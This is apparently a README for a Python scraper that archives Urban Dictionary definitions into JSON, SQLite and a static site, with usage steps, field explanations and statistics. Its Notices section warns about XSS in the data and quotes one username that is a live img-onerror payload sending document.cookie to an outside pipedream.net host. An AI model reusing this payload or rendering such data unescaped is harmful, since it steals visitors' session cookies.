# UDOffliner

Create a backup of the UrbanDictionary for archival purposes.

DISCLAIMER: This project is in not affiliated with the UrbanDictionary website in any way shape or form.

### Features:

* [x] generate a `wordlist.json`
* [x] download all definitions into json files
  * [x] description
  * [x] examples
  * [x] date
  * [x] author
  * [x] votes
* [x] unify json files
* [x] generate SQLite database
* [x] static site generator

### Notices:

* in order to not DDOS the server it sleeps between each request and therefore takes at least 3 days.
* if anything goes wrong it throws an error, never catches it, and crashes. since it regularly (every 1000 words) saves it shouldnt be too bad.
* this uses webscraping and therefore might break at any point if UD changes their html layout.
* when further processing the data keep in mind that some people try to use XSS. the following is a real username: `">'><img src=x onerror=this.src='https://979a41ce4a43a6b13026a4e627cea02b.m.pipedream.net/my.urbandictionary.com/handle.php?cookie=' document.cookie '--' document.domain;this.removeAttribute('onerror'); >`

### Dependencies:

Required:

* Python3 (programming language) (preferably 3.11 since that one has been tested)
* BeautifulSoup4 (html parser)
* requests (http request sender)

Optional:

* GNU Make (automatically run scripts in correct order)

Helpful for further exploration / use:

* [nushell](https://github.com/nushell/nushell) is great for exploring and converting data.
* `gzip` can be used to compress them and reduce the storage space needed.
* [dbeaver](https://dbeaver.io/) is great for exploring SQL (if you know SQL).

### Usage:

1. clone this git repo and open a terminal in it ([tutorial](https://www.atlassian.com/git/tutorials/setting-up-a-repository/git-clone)).
2. check the code for viruses. no it does not contain any, but i could be lying and you should always check.
3. install all dependencies.
4. run `make all`.
  * or `make staticsite`

alternative to `make all`:
```bash
python3 ./download_data.py
python3 ./unify.py until_idx_*.json > ud.json
python3 ./toSqlite.py ud.json ud.sqlite3
```

Resulting files:

* `wordlist.json`: A list of all "words" (pages). Used for caching / later processing.
* `until_idx_*.json`: All words up until (counted) index x. Used for caching / later processing.
* `ud.json`: The entirety of UD in a single JSON file.
* `ud.sqlite3`: The entirety of UD in a single SQLite3 database.

Datafield / Colums / .. explanations:

* `DefinitionId` (sql) / `id` (json): UD's ID for the definition (not word).
* `Word`: The word as stylised by the definition author.
* `Meaning` / `definition`: The translation of the word provided by that definition.
* `AuthorName`: UD username of whoever wrote the definition.
* `DefinitionDate`: when was it defined (json uses `YYYY-MM-DD` format).
* `Upvotes`: the count of upvotes on UD.
* `Downvotes`: the count of downvotes on UD.
* `Examples`: A list of examples given by the definition author. (own table in SQL since multiple can be given.)
* `Pagenames`: HTTP/HTML pagename from where the definition was pulled. Since some are on multiple this is a list / own table.

### Some fun statistics about UD

(state: `2024-05`)

Count  | Thing
-----: | :----------
25,369 | Words
29,229 | Authors
31,410 | Definitions

Most upvoted definition (54,102): `qwertyuiopasdfghjklzxcvbnm`: `A phenomena that happens to a computer's keyboard when a human being is bored to death...` by `Kaiser291`.

First definition (2000-01-20): `h2h`: `"heart to heart"spill your guts to a friend during a heart to heart conversationactually the person doesn't even have to be a friend. go have a h2h with some random person on the street.` by `alpha`.
